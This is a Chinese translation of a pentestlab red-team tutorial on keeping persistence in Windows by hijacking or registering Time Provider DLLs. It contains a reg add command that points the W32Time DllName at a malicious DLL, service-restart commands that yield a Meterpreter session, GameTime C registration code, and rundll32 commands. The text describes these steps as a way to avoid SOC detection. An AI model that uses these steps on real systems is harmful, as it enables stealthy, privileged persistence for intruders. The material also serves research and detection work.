# Window权限维持（八）：时间服务器

来源: 03-干货系列\Window权限维持整理\Window权限维持（八）：时间服务器.pdf

Windows操作系统正在利用时间提供者体系结构，以便从网络中的其他网络设备或客户端获取准确的
时间戳。时间提供者以DLL文件的形式实现，该文件位于System32文件夹中。Windows启动期间将启
动服务W32Time并加载w32time.dll。DLL加载是一种已知的技术，通常使红队攻击者有机会执行任
意代码。
由于关联的服务会在Windows启动期间自动启动，因此可以将其用作持久性机制。但是，此方法需要
管理员级别的特权，因为指向时间提供者DLL文件的注册表项存储在HKEY_LOCAL_MACHINE中。
根据系统是用作NTP服务器还是NTP客户端，使用以下两个注册表位置。
该W32Time将运行在Windows环境作为本地服务，它是通过svchost的执行。
W32Time服务
恶意DLL已放入磁盘中，将执行有效负载。在命令提示符下，可以通过执行以下命令以指向任意DLL的
位置来修改时间提供者注册表项。
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpCl
ient
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpSe
rver
reg add 
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpC
lient" /v DllName /t REG_SZ /d "C:\temp\w32time.dll"

时间提供者–注册表项修改
从注册表编辑器中查看注册表将确认DllName的值已更新。
时间提供者–恶意DLL
该服务将在Windows启动期间启动，或者通过执行以下命令手动启动。
sc.exe stop w32time
sc.exe start w32time

时间提供者–重新启动服务
将执行任意有效负载，并建立Meterpreter会话。
时间提供者– Meterpreter
修改Windows时间提供程序可能会向SOC团队发出警报。来自Carbon Black的Scott Lundgren在C中
开发了一种称为gametime的时间提供程序。可以使用此DLL来向操作系统注册新的时间提供者，并在
其他注册表项中执行修改。这样可以避免滥用现有的Windows时间提供程序，而该时间提供程序可以
由SOC监视。Rundll32可用于注册DLL。
Scott Lundgren使用了要在系统上创建的注册表项“ GameTime”。
#define GAMETIME_SVC_KEY_NAME   
L"System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\GameTime"

时间提供者– GameTime注册表项
根据Microsoft 文档，时间提供者必须实现以下回调函数。
TimeProvOpen
TimeProvCommand
TimeProvClose
TimeProvOpen用于返回提供者句柄，TimeProvCommand用于将命令发送到时间提供者，而
TimeProvClose用于关闭时间提供者。
HRESULT __stdcall TimeProvOpen(
    _In_  WCHAR                *wszName,
    _In_  TimeProvSysCallbacks *pSysCallbacks,
    _Out_ TimeProvHandle       *phTimeProv
)
{
    UNREFERENCED_PARAMETER(pSysCallbacks);
    UNREFERENCED_PARAMETER(phTimeProv);
 
    OutputDebugStringW(wszName);
 
    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));
}
 
/*
 *
 */
HRESULT __stdcall TimeProvCommand(
    _In_ TimeProvHandle hTimeProv,
    _In_ TimeProvCmd    eCmd,
    _In_ PVOID          pvArgs
)
{
    UNREFERENCED_PARAMETER(hTimeProv);
    UNREFERENCED_PARAMETER(eCmd);
    UNREFERENCED_PARAMETER(pvArgs);
 

时间提供者–回调功能
GameTime提供程序将在系统上填充以下注册表项，因为它们是Microsoft时间提供程序规范的一部
分。
DllName,
Enabled
InputProvider
    return (HRESULT_FROM_WIN32(ERROR_NOT_CAPABLE));
}
 
/*
 *
 */
HRESULT __stdcall TimeProvClose(
    _In_ TimeProvHandle hTimeProv
)
{
    UNREFERENCED_PARAMETER(hTimeProv);
 
    return (S_OK);
}

该DLLNAME指示包含供应商，该DLL的名称启用使然是否提供商应在系统启动过程中启动。值“ 1”启
动系统的提供者，而InputProvider指示提供者是输入还是输出。注册表值“ 1”表示已输入提供者。这
些在下面的代码中指定：
nRet = RegSetValueExW(hkTimeProvider,
                      L"DllName",
                      0,
                      REG_SZ,
                      (LPBYTE)g_wzModule,
                      (DWORD)wcslen(g_wzModule)*sizeof(WCHAR)+sizeof(WCHAR));
if (ERROR_SUCCESS != nRet)
{
    OutputError(L"RegCreateKeyExW failed", nRet);
    goto ErrorExit;
}
 
nRet = RegSetValueExW(hkTimeProvider,
                      L"Enabled",
                      0,
                      REG_DWORD,
                      (LPBYTE)&dwOne,
                      sizeof(dwOne));
if (ERROR_SUCCESS != nRet)
{
    OutputError(L"RegCreateKeyExW failed", nRet);
    goto ErrorExit;
}
 
nRet = RegSetValueExW(hkTimeProvider,
                      L"InputProvider",
                      0,
                      REG_DWORD,
                      (LPBYTE)&dwOne,
                      sizeof(dwOne));
if (ERROR_SUCCESS != nRet)
{
    OutputError(L"RegCreateKeyExW failed", nRet);
    goto ErrorExit;
}

时间提供者–注册表项值
该代码还使用Deregister回调函数从系统中删除创建的注册表项GameTime，作为清理过程。
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\GameT
ime
void CALLBACK Deregister(
    _In_ HWND hWnd,
    _In_ HINSTANCE hInst,
    _In_ LPSTR pwzCmdLine,
    _In_ int nCmdShow)
{
    long    nRet;
 
    UNREFERENCED_PARAMETER(hWnd);
    UNREFERENCED_PARAMETER(hInst);
    UNREFERENCED_PARAMETER(pwzCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);
 
    OutputDebugStringW(L"Unregister\n");
 
    nRet = RegDeleteKeyW(HKEY_LOCAL_MACHINE, GAMETIME_SVC_KEY_NAME);
    if (ERROR_SUCCESS != nRet)
    {

注销回调功能
实际上，可以使用rundll32向系统注册DLL，以便创建关联的注册表项，默认情况下，该注册表项将与
系统一起启用新的时间提供程序。
rundll32.exe gametime.dll,Register 
        OutputError(L"RegDeleteKeyW failed!", nRet);
        goto ErrorExit;
    }
 
ErrorExit:
 
    return;
}

注册新的时间提供者
将创建注册表项GameTime，并且DllName将包含DLL的路径。
新时间提供商注册表项
再次修改注册表以包含任意DLL，将在服务重新启动期间执行类似于Windows时间提供程序的代码。
新时间提供商注册表项修改
该注销功能可用于删除所有相关联的密钥和系统上进行清理。
rundll32.exe gametime.dll,Deregister 

取消注册新时间提供商
译文声明：本文由Bypass整理并翻译，仅用于安全研究和学习之用。
原文地址：https://pentestlab.blog/2019/10/22/persistence-time-providers/
 
